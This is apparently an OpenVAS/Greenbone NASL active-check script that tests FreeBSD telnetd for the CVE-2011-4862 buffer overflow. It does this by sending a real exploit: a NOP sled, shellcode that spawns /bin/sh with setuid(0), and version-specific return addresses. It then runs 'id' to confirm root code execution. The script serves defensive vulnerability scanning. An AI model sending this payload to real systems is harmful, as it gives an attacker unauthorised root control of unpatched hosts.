# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103373");
  script_cve_id("CVE-2011-4862");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2022-02-11T08:39:43+0000");
  script_name("FreeBSD 'telnetd' Daemon Remote Buffer Overflow Vulnerability (FreeBSD-SA-11:08.telnetd) - Active Check");
  script_tag(name:"last_modification", value:"2022-02-11 08:39:43 +0000 (Fri, 11 Feb 2022)");
  script_tag(name:"creation_date", value:"2011-12-28 12:32:36 +0100 (Wed, 28 Dec 2011)");
  script_category(ACT_ATTACK);
  script_family("Buffer overflow");
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("telnetserver_detect_type_nd_version.nasl");
  script_require_ports("Services/telnet", 23);
  script_mandatory_keys("telnet/freebsd/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51182");
  script_xref(name:"URL", value:"http://security.freebsd.org/advisories/FreeBSD-SA-11:08.telnetd.asc");

  script_tag(name:"summary", value:"FreeBSD is prone to a remote buffer-overflow vulnerability.");

  script_tag(name:"impact", value:"Exploiting this issue allows remote attackers to execute
  arbitrary code with superuser privileges. Successfully exploiting this issue will completely
  compromise affected computers.");

  script_tag(name:"affected", value:"The telnetd daemon on FreeBSD 7.2, 7.3, 7.4, 8.0, 8.1 and 8.2.");

  script_tag(name:"solution", value:"Updates are available to address this issue. Please see the
  references for more information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("telnet_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("dump.inc");

port = telnet_get_port(default:23);
banner = telnet_get_banner(port:port);
if(!banner || "FreeBSD" >!< banner)
  exit(0);

fbsd[0] = raw_string(0xed, 0xee); # FreeBSD 8.0 & 8.1
fbsd[1] = raw_string(0xa6, 0xee); # FreeBSD 8.2
fbsd[2] = raw_string(0x86, 0xde); # FreeBSD 7.2 & 7.3 & 7.4

foreach bsd(fbsd) {

  if(!soc = open_sock_tcp(port))
    continue;

  recv = recv(socket:soc, length:256);

  req = raw_string(0xff, 0xfa, 0x26, 0x00, 0x01, 0x01, 0x12, 0x13,
                   0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0xff, 0xf0,
                   0x00);

  send(socket:soc, data:req);

  recv = recv(socket:soc, length:8192);
  if(!recv || strlen(recv) < 8) {
    close(soc);
    continue; # nb: No "exit(0);", might be just a network hiccup
  }

  if(hexstr(recv) !~ "fffa260201") {
    close(soc);
    exit(0); # nb: telnetd does not support encryption so no need to continue...
  }

  req = raw_string(0xff, 0xfa, 0x26, 0x07, 0x00, 0x90, 0x90, 0x90,
                   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                   0x90, 0x31, 0xc0, 0x50, 0xb0, 0x17, 0x50, 0xcd,
                   0x80, 0x50, 0x68, 0x6e, 0x2f, 0x73, 0x68, 0x68,
                   0x2f, 0x2f, 0x62, 0x69, 0x89, 0xe3, 0x50, 0x54,
                   0x53, 0x50, 0xb0, 0x3b, 0xcd, 0x80, 0x00, 0x90,
                   0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                   0x90, 0x90, 0x90, 0x90, 0x44, 0x45, 0x41, 0x44,
                   0x42, 0x45, 0x45, 0x46, 0x6c, 0x6f, 0x05, 0x08);
  req += bsd;

  req += raw_string(0x05, 0x08, 0xff, 0xf0, 0x00);

  send(socket:soc, data:req);

  recv = recv(socket:soc, length:8192);
  if(!recv || strlen(recv) < 6) {
    close(soc);
    continue;
  }

  send(socket:soc, data:req);
  send(socket:soc, data:raw_string(0x69, 0x64, 0x0a)); # command: id

  recv = recv(socket:soc, length:8192);

  close(soc);

  if(found = eregmatch(string:recv, pattern:"uid=[0-9]+.*gid=[0-9]+", icase:FALSE)) {
    report = 'It was possible to execute the "id" command.\n\nResult:\n' + found[0];
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(0);
